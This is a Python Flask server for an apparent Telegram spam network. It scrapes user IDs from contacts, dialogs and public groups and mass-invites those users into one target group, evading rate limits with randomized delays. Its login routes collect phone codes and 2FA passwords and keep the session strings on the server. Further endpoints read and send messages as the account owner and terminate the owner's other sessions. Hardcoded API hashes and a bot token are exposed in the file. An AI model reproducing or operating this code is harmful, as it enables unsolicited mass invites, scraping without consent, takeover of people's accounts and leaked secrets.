#!/usr/bin/env python3
"""
Telegram Auto-Add Server - STABLE VERSION
Each server uses its own unique API credentials
"""

from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest, GetParticipantsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import (
    PeerChannel, PeerUser, PeerChat,
    ChannelParticipantsRecent
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
from collections import defaultdict

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ============================================
# CHANGE THIS NUMBER ONLY - 1 TO 5
# ============================================
SERVER_NUMBER = 4  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 30475007, 'api_hash': '736ea0e80ae99ff36c8b65525bda3997', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUP = 'Abe_armygroup'

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
SERVER_ADMIN_FILE = 'server_admin.json'

# Storage
accounts = []
temp_sessions = {}
auto_add_settings = {}
running_tasks = {}
worker_adds = defaultdict(list)
server_admin = {}

stats = {
    'total_added': 0, 'today_added': 0, 'verified_total': 0, 'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'), 'last_verification': None,
    'daily_history': {}, 'worker_stats': {}, 'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat()
}

OTHER_SERVERS = [
    {'name': 'Dil', 'num': 1, 'url': 'https://dilbedl.onrender.com'},
    {'name': 'sofu', 'num': 2, 'url': 'https://sofuu.onrender.com'},
    {'name': 'bebby', 'num': 3, 'url': 'https://bebby.onrender.com'},
    {'name': 'kaleb', 'num': 4, 'url': 'https://kaleb-bwgb.onrender.com'},
    {'name': 'fitsum', 'num': 5, 'url': 'https://fitsum-ev9d.onrender.com'}
]

# Thread-safe lock for file operations
file_lock = threading.Lock()

def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except:
        pass
    return default

def save_json(path, data):
    with file_lock:
        try:
            with open(path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"Save error: {e}")

# ============================================
# SIMPLE SYNC WRAPPER - No shared event loop
# ============================================
def run_telethon_task(async_func, timeout=60):
    """Run a Telethon async function in a new event loop"""
    loop = asyncio.new_event_loop()
    try:
        result = loop.run_until_complete(async_func())
        return result
    except Exception as e:
        logger.error(f"Telethon task error: {e}")
        raise
    finally:
        loop.close()

def get_client(acc):
    return TelegramClient(
        StringSession(acc['session']), API_ID, API_HASH,
        connection_retries=3, retry_delay=1, timeout=30
    )

def reset_daily():
    today = datetime.now().strftime('%Y-%m-%d')
    if stats.get('last_reset') != today:
        stats['today_added'] = 0
        stats['verified_today'] = 0
        stats['last_reset'] = today
        for k in stats.get('worker_stats', {}):
            stats['worker_stats'][k]['today'] = 0
            stats['worker_stats'][k]['verified_today'] = 0
        save_json(STATS_FILE, stats)

def check_account_auth(acc):
    async def _check():
        client = get_client(acc)
        await client.connect()
        try:
            return await client.is_user_authorized()
        finally:
            await client.disconnect()
    
    try:
        return run_telethon_task(_check, timeout=15)
    except:
        return False

def remove_dead_account(aid, reason=""):
    global accounts
    acc = next((a for a in accounts if a['id'] == aid), None)
    name = acc.get('name', str(aid)) if acc else str(aid)
    
    accounts = [a for a in accounts if a['id'] != aid]
    auto_add_settings.pop(str(aid), None)
    running_tasks.pop(str(aid), None)
    worker_adds.pop(str(aid), None)
    
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    
    stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
    save_json(STATS_FILE, stats)
    
    logger.warning(f"Removed dead account: {name} | Reason: {reason}")
    try:
        send_telegram(f"<b>{SERVER_NAME}</b>\nRemoved: {name}\nReason: {reason}")
    except:
        pass
    return name

def send_telegram(text):
    try:
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
            timeout=10
        )
    except Exception as e:
        logger.error(f"Send telegram error: {e}")

# ============================================
# AUTO-ADD WORKER (Runs in its own thread)
# ============================================
def auto_add_worker(account):
    acc_id = account['id']
    acc_key = str(acc_id)
    attempted = set()
    joined = False
    cycle_count = 0
    
    logger.info(f"AUTO-ADD STARTED: {account.get('name')} -> @{TARGET_GROUP}")
    
    while True:
        try:
            settings = auto_add_settings.get(acc_key, {})
            if not settings.get('enabled', True):
                time.sleep(10)
                continue
            
            reset_daily()
            
            try:
                # Create fresh event loop for each cycle
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                client = get_client(account)
                loop.run_until_complete(client.connect())
                
                if not loop.run_until_complete(client.is_user_authorized()):
                    logger.error(f"Account {acc_id} not authorized")
                    loop.run_until_complete(client.disconnect())
                    loop.close()
                    remove_dead_account(acc_id, "Not authorized")
                    break
                
                me = loop.run_until_complete(client.get_me())
                worker_name = me.first_name or 'User'
                
                if not joined:
                    try:
                        grp = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                        loop.run_until_complete(client(JoinChannelRequest(grp)))
                        joined = True
                        logger.info(f"{worker_name} joined @{TARGET_GROUP}")
                    except Exception as e:
                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
                            joined = True
                
                group = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                
                all_ids = set()
                
                # Collect members
                try:
                    contacts = loop.run_until_complete(client(GetContactsRequest(0)))
                    for c in contacts.users:
                        if c.id and not c.bot:
                            all_ids.add(c.id)
                except:
                    pass
                
                try:
                    dialogs = loop.run_until_complete(client.get_dialogs(limit=500))
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id and not getattr(d.entity, 'bot', False):
                            all_ids.add(d.entity.id)
                except:
                    pass
                
                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', '@TelegramNews',
                                 '@builders', '@Android', '@iOS', '@Python', '@programming']
                for sg in source_groups:
                    try:
                        entity = loop.run_until_complete(client.get_entity(sg))
                        participants = loop.run_until_complete(client.get_participants(entity, limit=300))
                        for user in participants:
                            if user.id and not user.bot:
                                all_ids.add(user.id)
                        time.sleep(1)
                    except:
                        pass
                
                logger.info(f"Total unique IDs: {len(all_ids)}")
                
                fresh = [uid for uid in all_ids if uid not in attempted]
                if len(fresh) < 50:
                    attempted.clear()
                    fresh = list(all_ids)
                
                random.shuffle(fresh)
                cycle_count += 1
                added_this_cycle = 0
                delay = max(25, settings.get('delay_seconds', 25))
                
                for uid in fresh[:500]:
                    settings_check = auto_add_settings.get(acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted.add(uid)
                    
                    try:
                        user_input = loop.run_until_complete(client.get_input_entity(uid))
                        loop.run_until_complete(client(InviteToChannelRequest(group, [user_input])))
                        
                        add_record = {
                            'user_id': uid, 'time': datetime.now().isoformat(),
                            'added_by': worker_name, 'worker_id': acc_id
                        }
                        worker_adds[acc_key].append(add_record)
                        
                        stats['today_added'] = stats.get('today_added', 0) + 1
                        stats['total_added'] = stats.get('total_added', 0) + 1
                        
                        if acc_key not in stats['worker_stats']:
                            stats['worker_stats'][acc_key] = {'total': 0, 'today': 0, 'verified_total': 0, 'verified_today': 0}
                        stats['worker_stats'][acc_key]['today'] += 1
                        stats['worker_stats'][acc_key]['total'] += 1
                        
                        added_this_cycle += 1
                        
                        actual_delay = random.uniform(delay * 0.8, delay * 1.2)
                        time.sleep(actual_delay)
                        
                    except errors.FloodWaitError as e:
                        wait_time = min(e.seconds + random.randint(5, 15), 300)
                        logger.warning(f"Flood wait {wait_time}s")
                        time.sleep(wait_time)
                    except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                            errors.UserAlreadyParticipantError, errors.UserKickedError,
                            errors.UserBannedInChannelError):
                        continue
                    except errors.rpcerrorlist.AuthKeyUnregisteredError:
                        logger.error(f"Auth key unregistered for {acc_id}")
                        loop.run_until_complete(client.disconnect())
                        loop.close()
                        remove_dead_account(acc_id, "Auth key unregistered")
                        return
                    except Exception:
                        continue
                    
                    if added_this_cycle % 20 == 0:
                        save_json(STATS_FILE, stats)
                        save_json(WORKER_ADDS_FILE, dict(worker_adds))
                
                logger.info(f"Cycle {cycle_count}: +{added_this_cycle} | Today: {stats['today_added']} | Total: {stats['total_added']}")
                save_json(STATS_FILE, stats)
                save_json(WORKER_ADDS_FILE, dict(worker_adds))
                
                loop.run_until_complete(client.disconnect())
                loop.close()
                
            except errors.rpcerrorlist.AuthKeyUnregisteredError:
                logger.error(f"Auth key unregistered for account {acc_id}")
                remove_dead_account(acc_id, "Auth key unregistered")
                break
            except Exception as e:
                logger.error(f"Loop error: {e}")
                try:
                    loop.run_until_complete(client.disconnect())
                except:
                    pass
                try:
                    loop.close()
                except:
                    pass
            
            rest = random.randint(60, 180)
            time.sleep(rest)
            
        except Exception as e:
            logger.error(f"Critical worker error: {e}")
            time.sleep(60)

def start_auto_add(account):
    acc_key = str(account['id'])
    if acc_key in running_tasks and running_tasks[acc_key].is_alive():
        return
    t = threading.Thread(target=auto_add_worker, args=(account,), daemon=True)
    t.start()
    running_tasks[acc_key] = t
    logger.info(f"Started worker for: {account.get('name', account['id'])}")

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
@app.route('/auto-add')
def auto_add_page():
    return send_file('auto_add.html')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard_page():
    return send_file('dashboard.html')

@app.route('/dash')
def dash_page():
    return send_file('dash.html')

@app.route('/all')
def all_page():
    return send_file('all.html')

@app.route('/ping')
def ping():
    return jsonify({'status': 'ok', 'server': SERVER_NAME, 'api_id': API_ID})

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_group': TARGET_GROUP,
            'api_id': API_ID
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        aid_str = str(a['id'])
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        is_admin = server_admin.get(str(SERVER_NUMBER)) == a['id']
        acc_list.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', ''),
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
            'is_admin': is_admin,
            'stats': {
                'total_attempted': ws.get('total', 0),
                'today_attempted': ws.get('today', 0),
                'total_verified': ws.get('verified_total', 0),
                'today_verified': ws.get('verified_today', 0)
            }
        })
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone} using API_ID: {API_ID}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                logger.info(f"Code sent to {phone}, session: {sid}")
                return {'success': True, 'session_id': sid}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except Exception as e:
                logger.error(f"Send code error: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(send_code, timeout=45)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Request new code.'})
        
        td = temp_sessions[sid]
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    await client.sign_in(password=pwd)
                
                me = await client.get_me()
                new_id = int(time.time() * 1000)
                
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True
                }
                accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUP,
                    'delay_seconds': 25,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_id)] = {
                    'total': 0, 'today': 0, 'verified_total': 0, 'verified_today': 0
                }
                save_json(STATS_FILE, stats)
                
                start_auto_add(new_acc)
                
                return {
                    'success': True,
                    'account': {'id': new_id, 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'auto_add_started': True
                }
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
            except errors.PasswordHashInvalidError:
                return {'success': False, 'error': 'Wrong 2FA password'}
            except Exception as e:
                logger.error(f"Verify error: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(verify, timeout=45)
        
        if sid in temp_sessions:
            del temp_sessions[sid]
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    aid = request.json.get('accountId')
    name = remove_dead_account(aid, "Manual removal")
    return jsonify({'success': True, 'message': f'Removed: {name}'})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    try:
        data = request.json
        aid = data.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = get_client(acc)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                dialogs = await client.get_dialogs(limit=100)
                
                chats_list = []
                all_messages = []
                
                for dialog in dialogs:
                    try:
                        chat_id = str(dialog.id)
                        chat_type = 'user'
                        title = dialog.name or 'Unknown'
                        
                        if dialog.is_group:
                            chat_type = 'group'
                        elif dialog.is_channel:
                            chat_type = 'channel'
                        
                        if hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                            chat_type = 'bot'
                        
                        last_msg_text = ''
                        last_msg_date = 0
                        last_msg_media = None
                        
                        if dialog.message:
                            last_msg_text = (dialog.message.message or '')[:200]
                            if dialog.message.date:
                                last_msg_date = dialog.message.date.timestamp()
                            if dialog.message.media:
                                if hasattr(dialog.message.media, 'photo'):
                                    last_msg_media = 'photo'
                                elif hasattr(dialog.message.media, 'document'):
                                    last_msg_media = 'document'
                        
                        chats_list.append({
                            'id': chat_id,
                            'title': title,
                            'type': chat_type,
                            'unread': dialog.unread_count or 0,
                            'lastMessage': last_msg_text,
                            'lastMessageDate': last_msg_date,
                            'lastMessageMedia': last_msg_media
                        })
                        
                        try:
                            messages = await client.get_messages(dialog.entity, limit=10)
                            for msg in messages:
                                if not msg.message and not msg.media:
                                    continue
                                
                                media_type = None
                                has_media = msg.media is not None
                                
                                if msg.media:
                                    if hasattr(msg.media, 'photo'):
                                        media_type = 'photo'
                                    elif hasattr(msg.media, 'document'):
                                        media_type = 'document'
                                    else:
                                        media_type = 'media'
                                
                                all_messages.append({
                                    'chatId': chat_id,
                                    'id': msg.id,
                                    'text': msg.message or '',
                                    'date': msg.date.timestamp() if msg.date else 0,
                                    'out': msg.out,
                                    'hasMedia': has_media,
                                    'mediaType': media_type
                                })
                        except:
                            pass
                    except:
                        continue
                
                return {'success': True, 'chats': chats_list, 'messages': all_messages}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(fetch, timeout=45)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        data = request.json
        aid = data.get('accountId')
        chat_id = data.get('chatId')
        message = data.get('message', '').strip()
        
        if not message:
            return jsonify({'success': False, 'error': 'Message required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def send():
            client = get_client(acc)
            await client.connect()
            try:
                entity = await client.get_entity(int(chat_id))
                await client.send_message(entity, message)
                return {'success': True}
            except:
                try:
                    entity = await client.get_entity(chat_id)
                    await client.send_message(entity, message)
                    return {'success': True}
                except Exception as e:
                    return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(send, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        aid_str = str(aid)
        s = auto_add_settings.get(aid_str, {
            'enabled': False, 'target_group': TARGET_GROUP, 'delay_seconds': 25
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        s['server_number'] = SERVER_NUMBER
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    akey = str(aid)
    
    was_on = auto_add_settings.get(akey, {}).get('enabled', False)
    auto_add_settings[akey] = {
        'enabled': data.get('enabled', False),
        'target_group': data.get('target_group', TARGET_GROUP),
        'delay_seconds': max(25, data.get('delay_seconds', 25)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if data.get('enabled') and not was_on:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = get_client(acc)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                available = 0
                try:
                    contacts = await client(GetContactsRequest(0))
                    available += len([c for c in contacts.users if not c.bot])
                except:
                    pass
                
                return {'success': True, 'available_members': available, 'target_group': TARGET_GROUP}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(test, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/join-group', methods=['POST'])
def join_group():
    try:
        aid = request.json.get('accountId')
        grp = request.json.get('group', TARGET_GROUP)
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Not found'})
        
        async def join():
            client = get_client(acc)
            await client.connect()
            try:
                entity = await client.get_entity(grp)
                await client(JoinChannelRequest(entity))
                return {'success': True, 'message': f'Joined {grp}'}
            except Exception as e:
                if 'already' in str(e).lower():
                    return {'success': True, 'message': 'Already member'}
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(join, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    try:
        data = request.json
        aid = data.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = get_client(acc)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                result = await client(functions.account.GetAuthorizationsRequest())
                current_hash = None
                sessions = []
                
                for auth in result.authorizations:
                    session_info = {
                        'hash': str(auth.hash),
                        'device_model': auth.device_model or 'Unknown',
                        'platform': auth.platform or 'Unknown',
                        'date_active': auth.date_active.timestamp() if auth.date_active else 0,
                        'ip': auth.ip or 'Unknown',
                        'country': auth.country or 'Unknown',
                        'current': auth.current
                    }
                    if auth.current:
                        current_hash = str(auth.hash)
                    sessions.append(session_info)
                
                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(fetch, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    try:
        data = request.json
        aid = data.get('accountId')
        hash_val = data.get('hash')
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = get_client(acc)
            await client.connect()
            try:
                await client(functions.account.ResetAuthorizationRequest(hash=int(hash_val)))
                return {'success': True, 'message': 'Session terminated'}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(terminate, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    try:
        data = request.json
        aid = data.get('accountId')
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = get_client(acc)
            await client.connect()
            try:
                result = await client(functions.account.GetAuthorizationsRequest())
                terminated = 0
                for auth in result.authorizations:
                    if not auth.current:
                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                            terminated += 1
                        except:
                            pass
                return {'success': True, 'message': f'Terminated {terminated} sessions'}
            finally:
                await client.disconnect()
        
        result = run_telethon_task(terminate, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-report')
def send_report():
    send_telegram(f"<b>{SERVER_NAME}</b> Report\nToday: {stats.get('today_added', 0)}\nTotal: {stats.get('total_added', 0)}")
    return jsonify({'success': True})

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    while True:
        time.sleep(240)
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
        except:
            pass

def restore_and_start():
    time.sleep(5)
    for acc in list(accounts):
        if acc.get('session'):
            if check_account_auth(acc):
                start_auto_add(acc)
            else:
                remove_dead_account(acc['id'], "Failed auth check on startup")
            time.sleep(2)
    logger.info("All accounts processed")

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    # Load existing data
    accounts.extend(load_json(ACCOUNTS_FILE, []))
    auto_add_settings.update(load_json(SETTINGS_FILE, {}))
    stats_data = load_json(STATS_FILE, {})
    if stats_data:
        stats.update(stats_data)
    worker_adds_data = load_json(WORKER_ADDS_FILE, {})
    if worker_adds_data:
        worker_adds.update(worker_adds_data)
    server_admin.update(load_json(SERVER_ADMIN_FILE, {}))
    
    print(f"""
╔══════════════════════════════════════╗
║  AUTO-ADD SERVER #{SERVER_NUMBER}                    ║
║  Name: {SERVER_NAME}                             ║
║  API ID: {API_ID}                       ║
║  Target: @{TARGET_GROUP}                ║
║  Port: {PORT}                           ║
╚══════════════════════════════════════╝
    """)
    
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=restore_and_start, daemon=True).start()
    
    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTarget: @{TARGET_GROUP}")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
